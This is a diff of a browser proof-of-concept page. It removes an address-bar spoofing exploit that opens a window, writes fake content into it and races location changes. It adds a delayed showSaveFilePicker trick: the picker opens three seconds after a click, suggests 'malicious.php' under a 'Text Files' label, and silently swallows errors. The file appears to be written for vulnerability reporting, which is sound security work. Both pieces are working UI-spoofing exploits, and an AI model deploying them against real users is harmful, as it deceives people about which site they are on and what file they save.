@@ -1,31 +1,53 @@
+<!DOCTYPE html>
+<html lang="en">
 <head>
-  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta charset="UTF-8" />
+  <title>Delayed File Save Picker</title>
+  <style>
+    body {
+      margin: 0;
+      height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      font-family: sans-serif;
+      background-color: #fafafa;
+      cursor: pointer;
+      user-select: none;
+    }
+    h1 {
+      color: #333;
+      text-align: center;
+      max-width: 400px;
+      padding: 20px;
+    }
+  </style>
 </head>
-
 <body>
-    <a href="javascript:window.open('https://www.amazon.com/','x');" onclick="startSpoof()">Spoof</a>
+  <h1>Click me anywhere.<br>Browse to hackerone.com and download the file from HackerOne</h1>
+
+  <script>
+    document.addEventListener('click', async () => {
+      setTimeout(async () => {
+        if ('showSaveFilePicker' in window) {
+          try {
+            const handle = await window.showSaveFilePicker({
+              suggestedName: 'malicious.php',
+              types: [{
+                description: 'Text Files',
+                accept: {'text/plain': ['.php']},
+              }],
+            });
+
+            const writable = await handle.createWritable();
+            await writable.write('This is a test file content.');
+            await writable.close();
+          } catch (err) {
+            // User canceled or error occurred — silently ignore
+          }
+        }
+      }, 3000);
+    }, { once: true });
+  </script>
 </body>
-    
-    <script>
-    
-    let windowSpoof;
-
-    function race() {
-      try {
-        windowSpoof.location.href !== 'about:blank';
-      }
-      catch (e) {
-        windowSpoof.location.href='https://www.google.com/csi';
-      }
-    }
-    
-    function startSpoof() {
-
-      windowSpoof = window.open("https://www.google.com:82","x");
-      windowSpoof.document.write("<h2>Your address bar has been spoofed. This is not https://www.amazon.com/</h2>");
-
-      setInterval('race()', 0);
-    
-    }
-   
-    </script>
+</html>
